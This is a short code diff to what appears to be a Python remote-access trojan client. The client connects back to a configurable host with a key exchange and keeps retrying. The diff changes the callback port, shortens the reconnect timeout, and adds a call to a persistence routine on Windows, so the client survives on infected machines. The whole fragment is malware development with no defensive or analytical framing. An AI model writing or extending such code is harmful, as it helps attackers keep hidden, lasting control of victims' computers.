@@ -14,10 +14,10 @@ from core import *
 
 # change these to suit your needs
 HOST = 'localhost'
-PORT = 1337
+PORT = 8084
 
 # seconds to wait before client will attempt to reconnect
-CONN_TIMEOUT = 30
+CONN_TIMEOUT = 5
 
 # determine system platform
 if sys.platform.startswith('win'):
@@ -88,6 +88,10 @@ def client_loop(conn, dhkey):
 
 def main():
     exit_status = 0
+
+
+    if sys.platform.startswith('win'):
+        persistence.run(PLAT)
 
     while True:
         conn = socket.socket()
